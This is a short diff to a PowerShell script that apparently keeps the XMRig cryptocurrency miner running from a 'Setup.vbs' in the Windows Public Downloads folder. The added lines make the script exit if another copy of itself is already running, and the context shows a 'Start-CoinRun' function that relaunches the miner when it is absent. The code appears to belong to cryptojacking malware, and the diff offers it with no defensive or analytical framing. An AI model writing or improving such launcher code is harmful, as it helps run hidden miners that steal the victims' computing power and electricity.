@@ -4,6 +4,17 @@ $setupPath = "C:\Users\Public\Downloads\Setup.vbs"
 $xmrigProcessName = "xmrig"
 $global:isStarting = $false
 
+$currentPID = $PID
+$alreadyRunning = Get-WmiObject Win32_Process -Filter "Name = 'powershell.exe'" |
+    Where-Object {
+        $_.ProcessId -ne $currentPID -and $_.CommandLine -like "*$scriptName*"
+    }
+
+if ($alreadyRunning) {
+    Write-Host "Script is already running. Exiting."
+    exit
+}
+
 function Start-CoinRun {
     $existing = Get-Process -Name $xmrigProcessName -ErrorAction SilentlyContinue
     if (!$existing -and !$global:isStarting) {
